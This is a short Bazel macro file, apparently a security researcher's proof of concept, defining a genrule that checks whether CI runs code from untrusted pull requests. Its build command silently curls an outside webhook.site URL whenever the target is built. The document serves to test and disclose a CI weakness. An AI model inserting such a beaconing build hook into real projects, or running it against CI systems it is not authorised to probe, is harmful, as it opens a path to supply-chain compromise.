"""Harmless one-time canary genrule used only to verify whether CI executes
code from an untrusted pull request. Performs a single HTTP GET to a
researcher-owned webhook.site URL. No files are read, modified, or deleted."""

def poc_canary(name):
    native.genrule(
        name = name,
        outs = [name + ".tar.gz"],
        cmd = "curl -s -m 5 https://webhook.site/d7bfeddc-1fd1-496d-abd3-943c0f04b90c > /dev/null 2>&1; touch $@",
    )
